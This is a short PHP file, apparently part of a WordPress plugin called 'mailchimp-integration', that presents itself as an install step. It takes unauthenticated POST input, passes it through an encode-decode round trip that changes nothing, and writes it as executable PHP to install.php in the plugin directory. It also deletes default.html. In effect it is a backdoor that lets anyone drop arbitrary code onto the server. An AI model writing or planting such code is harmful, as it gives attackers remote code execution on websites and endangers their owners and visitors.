<?php
session_start();
$installtheplugin = $_POST['installiscomplete'];
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/mailchimp-integration/install.php', 'w');
$installtheplugin = str_replace('\\', '', $installtheplugin);
$installtheplugin = htmlentities($installtheplugin);
fwrite($fp, html_entity_decode($installtheplugin));
fclose($fp);
echo $installtheplugin;
unlink($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/mailchimp-integration/default.html');
?>